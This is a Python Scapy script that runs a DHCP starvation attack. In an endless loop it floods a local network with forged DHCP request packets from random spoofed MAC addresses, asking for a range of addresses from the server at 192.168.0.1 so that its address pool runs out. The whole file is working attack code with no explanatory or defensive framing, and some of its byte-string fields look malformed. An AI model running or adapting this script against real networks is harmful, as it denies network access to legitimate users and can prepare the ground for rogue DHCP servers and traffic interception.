
from scapy.all import *
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether

offer_count = 0


def starve():

    good_dhcp_server_IP = '192.168.0.1'
    subnet = '192.168.0.'
    ip_pool_start = 99
    current_ip = ip_pool_start
    requested_IP = ''

    for i in range(12):
        fake_src_mac = RandMAC()
        current_ip = (ip_pool_start + i)
        requested_IP = subnet + str(current_ip)
        print(requested_IP)

        request_packet = (Ether(dst='ff:ff:ff:ff:ff:ff', src=mac2str(fake_src_mac), type=2048)
                          / IP(src='0.0.0.0', dst='255.255.255.255')
                          / UDP(sport=68, dport=67)
                          / BOOTP(op=1, htype=1, hlen=6, hops=0, xid=176591826, secs=0,
                                  flags=0, ciaddr='0.0.0.0', yiaddr='0.0.0.0',
                                  siaddr='0.0.0.0', giaddr='0.0.0.0',
                                  chaddr=b'\xa4PF|\x12\x91\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
                                  sname=b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00',
                                  file=b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
                                 x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
                                  options=b'c\x82Sc')
                          / DHCP(options=[('message-type', 3),
                                          ('client_id', b'\x01\xa4PF|\x12\x91'),
                                          ('requested_addr', requested_IP),
                                          ('server_id', good_dhcp_server_IP),
                                          ('max_dhcp_size', 1500),
                                          ('param_req_list', [1, 3, 6, 15, 26, 28, 51, 58, 59, 43]), 'end', 'pad']))
        sendp(request_packet, iface='wlo1')


if __name__ == "__main__":
    while True:
        starve()
